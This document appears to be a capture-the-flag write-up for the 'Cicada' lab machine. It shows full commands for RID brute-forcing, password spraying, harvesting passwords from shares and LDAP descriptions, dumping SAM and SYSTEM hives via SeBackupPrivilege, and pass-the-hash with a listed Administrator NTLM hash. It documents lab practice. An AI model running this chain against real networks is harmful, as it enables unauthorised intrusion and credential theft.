# Cicada: Machine Notes

## Recon

### Nmap
- AD Ports: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985

### Guest Access & Initial Creds
- SMB guest access allowed on `HR` share.
- Found `Notice from HR.txt` containing default password: `Cicada$M6Corpb*@Lp#nZp!8`.

### User Enumeration
- RID Brute-forcing with `netexec`:
```bash
netexec smb 10.129.46.147 -u guest -p '' --rid-brute
```
- Users found: `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious`, `emily.oscars`.

## Lateral Movement

### Pivot 1: Michael Wrightson
- Credential Spraying:
```bash
netexec smb 10.129.46.147 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
- Result: `michael.wrightson` is valid.

### Pivot 2: David Orelious
- Enumerate LDAP descriptions using Michael's creds:
```bash
netexec ldap 10.129.46.147 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
```
- Found password in David's description: `aRt$Lp#7t*VQ!3`.

### Pivot 3: Emily Oscars
- David has access to `DEV` share.
- Found `Backup_script.ps1` containing:
  - User: `emily.oscars`
  - Password: `Q!3@Lp#M6b*7t*Vt`

## Privilege Escalation

### SeBackupPrivilege Abuse
- `emily.oscars` has `SeBackupPrivilege` and `SeRestorePrivilege`.
- Use privileges to copy sensitive hives:
```powershell
# In Evil-WinRM
reg save hklm\sam c:\Windows\Tasks\SAM
reg save hklm\system c:\Windows\Tasks\SYSTEM
```
- Download files to Kali.

### Root Access (Administrator)
- Dump hashes locally:
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
- Administrator NTLM: `2b87e7c93a3e8a0ea4a581937016f341`
- Pass-the-Hash:
```bash
evil-winrm -i 10.129.46.147 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
